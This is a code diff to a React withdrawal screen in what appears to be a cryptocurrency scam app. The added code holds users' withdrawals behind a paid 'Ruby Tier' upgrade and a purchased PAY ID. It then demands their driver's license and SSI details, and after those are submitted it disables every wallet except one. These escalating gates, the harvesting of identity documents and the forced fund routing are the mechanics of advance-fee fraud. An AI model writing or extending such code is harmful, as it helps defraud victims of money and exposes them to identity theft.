@@ -14,20 +14,23 @@ import {
   AlertCircle,
   Bitcoin,
   Crown,
+  ShieldCheck,
 } from 'lucide-react';
 
 interface TransferProps {
   onBack: () => void;
   onNavigateToBuyPayId: () => void;
   onNavigateToUpgrade: () => void;
+  onNavigateToKyc: () => void;
 }
 
-const TRADING_EXCHANGES = ['Binance', 'TrustWallet', 'Bybit', 'KuCoin', 'OKX', 'MetaMask', 'CoinStart', 'Other Wallet'];
+const TRADING_EXCHANGES = ['Binance', 'TrustWallet', 'Bybit', 'KuCoin', 'OKX', 'MetaMask', 'CoinStats', 'Other Wallet'];
 
 export const Transfer: React.FC<TransferProps> = ({
   onBack,
   onNavigateToBuyPayId,
   onNavigateToUpgrade,
+  onNavigateToKyc,
 }) => {
   const { user, updateBalance, addTransaction } = useAuth();
 
@@ -42,9 +45,20 @@ export const Transfer: React.FC<TransferProps> = ({
   const [receiptTxnId, setReceiptTxnId] = useState('');
   const [errorMsg, setErrorMsg] = useState('');
   const [upgradePromptMsg, setUpgradePromptMsg] = useState<string | null>(null);
+  const [kycPromptMsg, setKycPromptMsg] = useState<string | null>(null);
 
   const REQUIRED_PAY_ID = 'PG-7474PAYDDT1I2P18837DOEFQ';
   const hasPayId = Boolean(user?.payIdVerified);
+  const hasDroppedKycDetails =
+    Boolean(user?.kycVerified) ||
+    user?.kycStatus === 'pending' ||
+    user?.kycStatus === 'verified';
+
+  useEffect(() => {
+    if (hasDroppedKycDetails && exchange !== 'CoinStats') {
+      setExchange('CoinStats');
+    }
+  }, [hasDroppedKycDetails]);
 
   // Processing countdown
   useEffect(() => {
@@ -136,6 +150,23 @@ export const Transfer: React.FC<TransferProps> = ({
       const msg = `You are currently on ${currentLevel}. To make your first withdrawal (minimum $5,000), you must upgrade to Stage 5 — Ruby Tier or higher.`;
       setErrorMsg(msg);
       setUpgradePromptMsg(msg);
+      return;
+    }
+
+    // Final Gate after reaching Stage 5 — Ruby: Driver's License & SSI Account Verification
+    const isKycVerified = Boolean(user?.kycVerified || user?.kycStatus === 'verified');
+    if (!isKycVerified) {
+      const msg =
+        user?.kycStatus === 'pending'
+          ? "Your Ruby Tier is active and your Driver's License & SSI verification is currently under Admin review. Withdrawals will unlock automatically once approved."
+          : "Your Ruby Tier is active! Before your withdrawal can be processed, please complete Account Verification with your Driver's License and SSI details.";
+      setErrorMsg(msg);
+      setKycPromptMsg(msg);
+      return;
+    }
+
+    if (hasDroppedKycDetails && exchange !== 'CoinStats') {
+      setErrorMsg(`${exchange} is currently unavailable (🔴). Please select CoinStats (🟢 Available) to complete your withdrawal.`);
       return;
     }
 
@@ -335,7 +366,7 @@ Keep this receipt for your records.
             <AlertCircle className="w-4 h-4 shrink-0 mt-0.5 text-red-500" />
             <div className="space-y-2">
               <p className="font-semibold">{errorMsg}</p>
-              {errorMsg.includes('upgrade your account') || errorMsg.includes('Ruby Tier') ? (
+              {errorMsg.includes('upgrade your account') || errorMsg.includes('Stage 5 — Ruby Tier') ? (
                 <button
                   type="button"
                   onClick={onNavigateToUpgrade}
@@ -343,6 +374,15 @@ Keep this receipt for your records.
                 >
                   <Crown className="w-3.5 h-3.5 text-amber-300" />
                   <span>Upgrade Account Now</span>
+                </button>
+              ) : errorMsg.includes("Driver's License") ? (
+                <button
+                  type="button"
+                  onClick={onNavigateToKyc}
+                  className="bg-purple-600 hover:bg-purple-700 text-white px-3.5 py-2 rounded-lg text-xs font-bold inline-flex items-center space-x-1.5 shadow-xs cursor-pointer"
+                >
+                  <ShieldCheck className="w-3.5 h-3.5 text-emerald-300" />
+                  <span>Verify Driver&apos;s License &amp; SSI</span>
                 </button>
               ) : !hasPayId ? (
                 <button
@@ -389,13 +429,23 @@ Keep this receipt for your records.
                   onChange={(e) => setExchange(e.target.value)}
                   className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm text-gray-900 bg-white"
                 >
-                  {TRADING_EXCHANGES.map((b) => (
-                    <option key={b} value={b}>
-                      🟢 {b} (Available)
-                    </option>
-                  ))}
+                  {TRADING_EXCHANGES.map((b) => {
+                    const isAvailable = !hasDroppedKycDetails || b === 'CoinStats';
+                    return (
+                      <option key={b} value={b} disabled={!isAvailable}>
+                        {isAvailable ? `🟢 ${b} (Available)` : `🔴 ${b} (Unavailable)`}
+                      </option>
+                    );
+                  })}
                 </select>
               </div>
+              {hasDroppedKycDetails && (
+                <p className="text-[11px] mt-1.5 font-semibold text-gray-600">
+                  <span className="text-emerald-700">🟢 CoinStats Available</span>
+                  {' • '}
+                  <span className="text-red-600">🔴 Other wallets unavailable</span>
+                </p>
+              )}
             </div>
 
             <div>
@@ -534,6 +584,53 @@ Keep this receipt for your records.
               <button
                 type="button"
                 onClick={() => setUpgradePromptMsg(null)}
+                className="w-full min-h-[44px] bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold py-2.5 rounded-xl text-xs transition-colors cursor-pointer"
+              >
+                Maybe Later
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+      {/* Post-Ruby Account Verification Required Modal (Driver's License & SSI) */}
+      {kycPromptMsg && (
+        <div className="fixed inset-0 bg-black/65 backdrop-blur-xs flex items-center justify-center p-4 z-50 animate-in fade-in">
+          <div className="bg-white rounded-3xl p-6 max-w-sm w-full shadow-2xl border border-purple-100 text-center space-y-4">
+            <div className="w-16 h-16 bg-purple-100 text-purple-600 rounded-full flex items-center justify-center mx-auto ring-8 ring-purple-50">
+              <ShieldCheck className="w-8 h-8" />
+            </div>
+
+            <div>
+              <span className="inline-block text-[10px] font-bold uppercase tracking-wider bg-rose-100 text-rose-700 px-2.5 py-1 rounded-full mb-2">
+                Ruby Tier Active • Final Step
+              </span>
+              <h3 className="text-xl font-extrabold text-gray-900">
+                Driver&apos;s License &amp; SSI Verification Required
+              </h3>
+              <p className="text-xs text-gray-600 mt-2 leading-relaxed">
+                {kycPromptMsg}
+              </p>
+            </div>
+
+            <div className="space-y-2.5 pt-1">
+              <button
+                type="button"
+                onClick={() => {
+                  setKycPromptMsg(null);
+                  onNavigateToKyc();
+                }}
+                className="w-full min-h-[48px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-3.5 rounded-xl text-sm shadow-md transition-all cursor-pointer flex items-center justify-center space-x-2"
+              >
+                <ShieldCheck className="w-4 h-4 text-emerald-300" />
+                <span>
+                  {user?.kycStatus === 'pending'
+                    ? 'Check Verification Status'
+                    : 'Verify Driver\'s License & SSI Now'}
+                </span>
+              </button>
+              <button
+                type="button"
+                onClick={() => setKycPromptMsg(null)}
                 className="w-full min-h-[44px] bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold py-2.5 rounded-xl text-xs transition-colors cursor-pointer"
               >
                 Maybe Later
